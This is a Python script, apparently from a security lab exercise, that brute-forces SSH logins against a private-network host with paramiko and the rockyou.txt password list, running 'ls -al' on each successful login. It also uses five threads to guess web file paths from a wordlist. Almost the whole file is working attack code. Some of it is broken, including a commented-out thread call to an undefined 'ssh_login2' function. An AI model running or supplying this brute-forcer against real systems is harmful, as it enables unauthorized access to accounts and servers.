import paramiko
import os
import time
import requests
import threading


password_dir = "./password/"
username_dir = "./username/"
filename_dir = "./filename/"
hostname = "192.168.1.70/cns-iot-geeks/"
protocol = "http://"
port = 22

def web_search(filelist):
    for filename in filelist:
        try:
            filename = filename.strip("\n")
            r = requests.get(protocol + hostname + filename)
        except:
            print("try connecting")
        if(r.status_code == 200):
            print(f"filename = {filename}")
            break

def ssh_login(userlist, passlist):
    for username in userlist:
        for password in passlist:
            try:
                username = username.strip('\n')
                password = password.strip('\n')
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname, port, username, password)
                stdin, stdout, stderr = client.exec_command('ls -al')
                result = stdout.readlines() 
                print(f"login success!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n username = {username} password = {password}")
            except paramiko.AuthenticationException:
                client.close()
                print("username & password mismatch")

def list_cut(list):
    res = []
    temp = len(list)//5
    res.append(list[0:temp])
    res.append(list[temp:2*temp])
    res.append(list[2*temp:3*temp])
    res.append(list[3*temp:4*temp])
    res.append(list[4*temp:])
    return res

if __name__ == "__main__":
    f = open(username_dir + 'web.txt', encoding = "utf-8")
    g = open(password_dir + 'rockyou.txt', encoding = "utf-8")
    k = open(filename_dir + "file.txt", encoding="utf-8")
    userlist = f.readlines()
    passlist = g.readlines()
    filelist = k.readlines()
#    cut = list_cut(passlist)
    cut = list_cut(filelist)
    threads = []
    for i in range(5): 
#        threads.append(threading.Thread(target = ssh_login2, args = (userlist, cut[i])))
        threads.append(threading.Thread(target = web_search, args = (cut[i],)))
    for i in range(len(threads)):
        threads[i].start()
    